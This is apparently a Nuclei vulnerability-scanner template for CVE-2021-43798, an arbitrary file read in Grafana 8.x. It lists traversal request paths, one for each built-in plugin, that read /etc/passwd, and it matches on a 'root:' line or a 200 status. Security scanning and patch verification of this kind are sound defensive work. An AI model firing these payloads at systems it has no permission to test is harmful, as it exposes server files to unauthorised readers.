id: CVE-2021-43798

info:
  name: Grafana v8.x Arbitrary File Read
  author: z0ne,dhiyaneshDk, yuyudhn
  severity: high
  description: Grafana is an open-source platform for monitoring and observability. Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is `<grafana_host_url>/public/plugins//`, where is the plugin ID for any installed plugin. At no time has Grafana Cloud been vulnerable. Users are advised to upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1. The GitHub Security Advisory contains more information about vulnerable URL paths, mitigation, and the disclosure timeline.
  reference:
    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
    - https://nosec.org/home/detail/4914.html
    - https://github.com/jas502n/Grafana-VulnTips
  tags: cve,cve2021,grafana,lfi
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2021-43798

requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alertGroups/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/alertmanager/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/annolist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/barchart/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/bargauge/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/canvas/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/cloudwatch/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/dashboard/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/dashlist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/debug/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/elasticsearch/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/gauge/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/geomap/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/gettingstarted/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/grafana/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/graph/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/graphite/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/heatmap/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/histogram/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/influxdb/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/jaeger/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/live/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/logs/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/loki/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/mixed/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/mssql/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/mysql/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/news/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/nodeGraph/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/opentsdb/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/piechart/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/pluginlist/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/postgres/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/prometheus/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/stat/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/state-timeline/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/status-history/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/table-old/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/table/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/tempo/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/testdata/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/text/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/timeseries/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/welcome/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/xychart/../../../../../../../../etc/passwd"
      - "{{BaseURL}}/public/plugins/zipkin/../../../../../../../../etc/passwd"

    matchers-condition: or
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
